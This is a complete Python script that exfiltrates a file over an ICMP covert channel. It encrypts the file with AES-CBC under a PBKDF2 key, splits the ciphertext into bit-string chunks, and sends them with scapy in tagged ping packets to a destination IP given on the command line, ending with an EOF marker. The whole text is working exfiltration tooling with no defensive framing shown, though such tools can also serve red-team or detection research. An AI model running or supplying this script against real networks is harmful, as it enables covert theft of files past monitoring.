#!/usr/bin/env python3
import argparse
import base64
import os
import shutil
import socket
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from scapy.all import IP, ICMP, send

# Function to pad data to be AES-block aligned
def pad(data):
    pad_len = 16 - len(data) % 16
    return data + bytes([pad_len] * pad_len)

# Function to encrypt data using AES (CBC mode) with PBKDF2 key derivation
def encrypt_data(data, password):
    salt = get_random_bytes(16)  # Generate random salt
    key = PBKDF2(password, salt, dkLen=32, count=100000)  # Generate key with PBKDF2
    cipher = AES.new(key, AES.MODE_CBC)  # Create AES cipher in CBC mode
    ct_bytes = cipher.encrypt(pad(data))  # Encrypt data with padding
    return salt + cipher.iv + ct_bytes  # Concatenate salt, IV, and ciphertext

# Convert file to base64 encoded binary string
def file_to_bin(file_path):
    with open(file_path, 'rb') as f:
        b64 = base64.b64encode(f.read())
    return ''.join(f"{byte:08b}" for byte in b64)

# Chunk binary data into fixed-size chunks
def chunk_data(data, size):
    return [data[i:i+size] for i in range(0, len(data), size)]

# Function to send data chunks over ICMP packets
def send_icmp_chunks(chunks, dest_ip, port_tag, verbose):
    for i, chunk in enumerate(chunks):
        pkt = IP(dst=dest_ip)/ICMP(type=8)/f"{port_tag}:{i}:{chunk}"
        send(pkt, verbose=0)
        if verbose:
            print(f"[+] Sent chunk {i+1}/{len(chunks)}")
    # Send EOF packet
    eof_pkt = IP(dst=dest_ip)/ICMP(type=8)/f"{port_tag}:EOF"
    send(eof_pkt, verbose=0)
    if verbose:
        print("[+] Sent EOF packet.")

# Main function
def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-L", required=True, help="Path of file to process")
    parser.add_argument("-P", required=True, help="Password for encryption")
    parser.add_argument("-D", required=True, help="Destination IP")
    parser.add_argument("-R", required=True, help="Logical port (tag)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    # Create temporary copy of file
    temp_file = args.L + ".copy"
    shutil.copy2(args.L, temp_file)
    if args.verbose:
        print(f"[+] Temporary file copied: {temp_file}")

    # Convert file to base64 binary
    bin_data = file_to_bin(temp_file)
    if args.verbose:
        print(f"[+] File converted to base64 binary: {len(bin_data)} bits")

    # Encrypt binary data
    encrypted = encrypt_data(bin_data.encode(), args.P)
    if args.verbose:
        print(f"[+] Data encrypted ({len(encrypted)} bytes)")

    # Convert encrypted data to binary string
    bitstream = ''.join(f"{byte:08b}" for byte in encrypted)
    chunks = chunk_data(bitstream, 1024)

    # Send encrypted data chunks over ICMP
    send_icmp_chunks(chunks, args.D, args.R, args.verbose)

    # Remove temporary file
    os.remove(temp_file)
    if args.verbose:
        print(f"[+] Temporary file removed: {temp_file}")

if __name__ == "__main__":
    main()
